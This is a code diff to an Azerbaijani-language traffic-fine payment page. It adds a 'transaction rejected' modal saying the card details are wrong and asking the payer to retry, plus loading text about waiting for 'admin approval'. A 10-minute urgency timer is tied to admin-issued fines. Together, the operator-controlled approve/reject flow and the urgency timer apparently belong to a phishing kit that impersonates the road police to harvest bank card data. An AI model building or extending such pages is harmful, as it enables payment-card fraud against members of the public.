@@ -162,12 +162,28 @@
         </div>
     </div>
 
+    <!-- REJECTION / ERROR MODAL -->
+    <div id="reject-modal" class="fixed inset-0 bg-black/70 flex items-center justify-center p-4 hidden z-50">
+        <div class="bg-white rounded-2xl max-w-md w-full p-8 text-center space-y-4 shadow-2xl border-t-8 border-red-600">
+            <div class="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto text-3xl font-bold shadow-inner">
+                ❌
+            </div>
+            <h3 class="font-bold text-gray-800 text-xl">Əməliyyat Rədd Edildi</h3>
+            <p id="reject-reason-text" class="text-sm text-gray-600 font-medium bg-red-50 p-4 rounded-xl border border-red-200">
+                Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.
+            </p>
+            <button onclick="location.reload()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl text-sm shadow transition">
+                🔄 Yenidən Cəhd Et
+            </button>
+        </div>
+    </div>
+
     <!-- LOADING / WAITING FOR APPROVAL MODAL -->
     <div id="loading-modal" class="fixed inset-0 bg-black/70 flex items-center justify-center p-4 hidden z-50">
         <div class="bg-white rounded-2xl max-w-sm w-full p-8 text-center space-y-4 shadow-2xl">
             <div class="inline-block animate-spin rounded-full h-16 w-16 border-4 border-blue-600 border-t-transparent"></div>
             <h3 class="font-bold text-gray-800 text-lg">Ödəniş Təsdiqlənir...</h3>
-            <p class="text-xs text-gray-500">Zəhmət olmasa gözləyin, bank əməliyyatı yoxlanılır.</p>
+            <p class="text-xs text-gray-500">Zəhmət olmasa gözləyin, bank əməliyyatı və admin təsdiqi yoxlanılır.</p>
         </div>
     </div>
 
@@ -237,12 +253,18 @@
         }
 
         function updateUI(data) {
-            // Check if protocol number changed (New fine issued by admin)
             let lastProtocol = localStorage.getItem('dyp_last_protocol');
             if (lastProtocol !== data.protocolNo) {
                 localStorage.setItem('dyp_last_protocol', data.protocolNo);
                 const newEndTime = Date.now() + 10 * 60 * 1000;
                 localStorage.setItem('dyp_timer_end', newEndTime);
+            }
+
+            if (data.isRejected) {
+                waitingForApproval = false;
+                document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
+                document.getElementById('reject-modal').classList.remove('hidden');
+                return;
             }
 
             if (data.isPaid) {
